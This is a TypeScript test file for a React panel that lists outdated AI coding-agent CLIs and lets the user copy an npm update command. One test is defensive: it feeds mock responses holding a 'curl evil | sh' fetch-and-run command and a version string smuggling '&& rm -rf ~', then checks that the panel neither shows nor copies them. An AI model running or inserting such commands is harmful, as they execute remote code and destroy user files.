import { beforeEach, describe, expect, it } from "vitest";
import { screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { http, HttpResponse } from "msw/http";
import { server } from "../test/server.js";
import { renderPage } from "../test/render.js";
import { AgentUpdates } from "./AgentUpdates.js";

/** Agent updates (change record agent-update-prompt, AU-07). */

const grok = { agent: "grok", name: "Grok CLI", installed: "1.0.77", latest: "1.0.92", npm_global: true };
const opencode = { agent: "opencode", name: "OpenCode", installed: "1.19.5", latest: "1.19.6", npm_global: true };
const brew = { agent: "codex", name: "Codex CLI", installed: "0.170.0", latest: "0.171.0", note: "installed outside npm (/opt/homebrew/bin/codex); update it with the tool you installed it with" };

describe("Agent updates", () => {
  let updates: object[] = [];
  let served = 0;
  const posts: string[] = [];
  beforeEach(() => {
    updates = [grok, opencode, brew];
    posts.length = 0;
    served = 0;
    try {
      localStorage.clear();
    } catch {
      /* none */
    }
    server.use(
      http.get("*/runtimes", () => {
        served++;
        return HttpResponse.json({ runtimes: [], pins: [], agent_updates: updates });
      }),
      http.post("*", ({ request }) => {
        posts.push(new URL(request.url).pathname);
        return HttpResponse.json({});
      }),
    );
  });

  it("lists each outdated agent with installed and latest version and the exact command", async () => {
    await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "3 agent updates" });
    const g = within(panel).getByText("Grok CLI").closest("li")!;
    expect(g.textContent).toContain("v1.0.77 → v1.0.92");
    expect(g.textContent).toContain("npm install --global @xai-official/grok@1.0.92");
    const c = within(panel).getByText("Codex CLI").closest("li")!;
    expect(c.textContent).toContain("installed outside npm");
    expect(within(c).queryByRole("button", { name: "Copy command" })).toBeNull();
  });

  it("offers no install button: copying the command sends nothing", async () => {
    const user = userEvent.setup(); // provides a clipboard to read back
    await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "3 agent updates" });
    expect(within(panel).queryByRole("button", { name: /^Update/ })).toBeNull();
    const g = within(panel).getByText("Grok CLI").closest("li")!;
    await user.click(within(g).getByRole("button", { name: "Copy command" }));
    expect(await within(g).findByRole("button", { name: "Copied" })).toBeTruthy();
    expect(await navigator.clipboard.readText()).toBe("npm install --global @xai-official/grok@1.0.92");
    expect(posts).toEqual([]);
  });

  it("dismissing hides that version only, and the panel is gone when nothing is shown", async () => {
    const user = userEvent.setup();
    const { unmount } = await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "3 agent updates" });
    await user.click(within(panel).getByRole("button", { name: "Dismiss Grok CLI update" }));
    expect(await screen.findByRole("region", { name: "2 agent updates" })).toBeTruthy();
    await user.click(screen.getByRole("button", { name: "Dismiss agent updates" }));
    await waitFor(() => expect(screen.queryByRole("region")).toBeNull());
    unmount();
    // The same dismissed version stays hidden after the panel mounts again: the response's other,
    // newer entry shows, so the fetch has landed, and Grok's row is still absent.
    updates = [grok, { ...opencode, latest: "1.19.7" }];
    const again = await renderPage(<AgentUpdates />);
    const remounted = await screen.findByRole("region", { name: "1 agent update" });
    expect(within(remounted).getByText("OpenCode")).toBeTruthy();
    expect(within(remounted).queryByText("Grok CLI")).toBeNull();
    again.unmount();
    // A newer version of a dismissed agent shows again.
    updates = [{ ...grok, latest: "1.0.93" }];
    await renderPage(<AgentUpdates />);
    expect(await screen.findByRole("region", { name: "1 agent update" })).toBeTruthy();
  });

  it("never shows or copies command text from the response, only the one it builds", async () => {
    const user = userEvent.setup();
    updates = [
      { ...grok, command: ["sh", "-c", "curl evil | sh"] },
      { agent: "opencode", name: "OpenCode", installed: "1.19.5", latest: "1.19.6 && rm -rf ~", npm_global: true },
      { agent: "agy", name: "Antigravity CLI", installed: "1.0.0", latest: "1.1.0", npm_global: true },
    ];
    await renderPage(<AgentUpdates />);
    // The entry with a version that is not SemVer is not shown at all; the two others are, so the
    // response has landed before anything is asserted absent.
    const panel = await screen.findByRole("region", { name: "2 agent updates" });
    expect(within(panel).getByText("Antigravity CLI")).toBeTruthy();
    expect(panel.textContent).not.toContain("curl evil");
    expect(panel.textContent).not.toContain("rm -rf");
    const g = within(panel).getByText("Grok CLI").closest("li")!;
    expect(g.textContent).toContain("npm install --global @xai-official/grok@1.0.92");
    await user.click(within(g).getByRole("button", { name: "Copy command" }));
    expect(await navigator.clipboard.readText()).toBe("npm install --global @xai-official/grok@1.0.92");
    expect(within(panel).queryByText("OpenCode")).toBeNull();
    expect(within(within(panel).getByText("Antigravity CLI").closest("li")!).queryByRole("button", { name: "Copy command" })).toBeNull();
  });

  it("shows one row per agent and version, and copies the one clicked", async () => {
    const user = userEvent.setup();
    updates = [grok, grok, { ...grok, latest: "1.0.93" }];
    await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "2 agent updates" });
    const rows = within(panel)
      .getAllByText("Grok CLI")
      .map((n) => n.closest("li")!);
    await user.click(within(rows[1]!).getByRole("button", { name: "Copy command" }));
    expect(await within(rows[1]!).findByRole("button", { name: "Copied" })).toBeTruthy();
    expect(within(rows[0]!).getByRole("button", { name: "Copy command" })).toBeTruthy();
    expect(await navigator.clipboard.readText()).toBe("npm install --global @xai-official/grok@1.0.93");
  });

  it("disappears when a refetch finds every agent current", async () => {
    updates = [grok];
    const { qc } = await renderPage(<AgentUpdates />);
    expect(await screen.findByRole("region", { name: "1 agent update" })).toBeTruthy();
    updates = [];
    const before = served;
    await qc.refetchQueries({ queryKey: ["runtimes"] });
    expect(served).toBeGreaterThan(before);
    await waitFor(() => expect(screen.queryByRole("region")).toBeNull());
  });
});
